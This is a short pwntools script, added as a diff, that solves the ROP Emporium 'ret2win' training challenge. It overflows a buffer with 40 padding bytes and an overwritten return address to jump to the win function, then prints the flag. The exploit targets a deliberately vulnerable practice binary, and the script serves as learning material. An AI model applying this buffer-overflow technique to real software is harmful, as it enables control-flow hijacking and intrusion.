@@ -1,0 +1,16 @@
+#!/usr/bin/python3
+from pwn import *
+
+
+# get the ELF binary into pwntools scope
+elf = context.binary = ELF('/home/b10tt0/Desktop/ropemp/ret2win/ret2win')
+payload = b"\42"*40+b"\x64\x07\x40\x00\x00\x00\x00\x00"
+
+# initialize and automate the process
+io = process(elf.path)
+# send payload after prompt '>' in bytes
+prompt = b"\x3e"
+io.sendlineafter(prompt, payload)
+io.recvline() # 'Thank you'
+flag = io.recvline().split() # catch the returned flag after thank you
+print(flag) # print flag
